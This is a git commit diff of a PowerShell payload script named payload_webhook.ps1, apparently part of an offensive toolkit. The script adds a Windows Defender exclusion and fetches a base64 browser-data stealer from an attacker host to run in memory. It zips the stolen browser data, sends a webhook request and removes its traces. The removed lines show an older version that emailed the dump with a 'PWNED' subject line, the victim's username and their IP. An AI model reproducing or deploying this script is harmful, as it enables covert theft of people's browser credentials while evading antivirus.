5ceaca1713072e07cb4990a9ee60b7c86345427f
GamehunterKaan <kaan007.gultekin@gmail.com>
2022-06-08 21:14:36 +0300

    Updated

--- templates/browser/payload_webhook.ps1
+++ templates/browser/payload_webhook.ps1
@@ -1,34 +1,19 @@
-$EMAIL = EMAIL
-$PASSWORD = PASSWORD
-$EMAIL_TO = EMAIL_TO
-#Adding windows defender exclusionpath
+$WH_URL = WEBHOOK
 Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
-#Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
-.\hb.exe --format json
+if ($null -eq $HBbytes) {
+    $HBbytes = Invoke-RestMethod "http://$lhost`:$webport/modules/HackBrowserData.b64"
+    $HBassembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($HBbytes))
+    $HBentrypoint = $HBassembly.GetType('Sharphackbrowserdata.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+}
+$HBentrypoint.Invoke($null, (, [string[]] ('','')))
 Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
-#Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
-$Random = Get-Random
-#Mailing the output you will need to enable less secure app access on your google account for this to work
-$Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential($EMAIL, $PASSWORD);
-$smtp.EnableSsl = $true
-$Message.From = $EMAIL
-$Message.To.Add($EMAIL_TO)
-$ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
-$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$Message.Body = $ComputerName
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
-$smtp.Send($Message)
-$Message.Dispose()
-$smtp.Dispose()
-#Cleanup
+curl `
+  -H "Content-Type: application/json" `
+  -d '{\"username\": \"test\", \"content\": \"hello\"}' `
+  $WH_URL
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
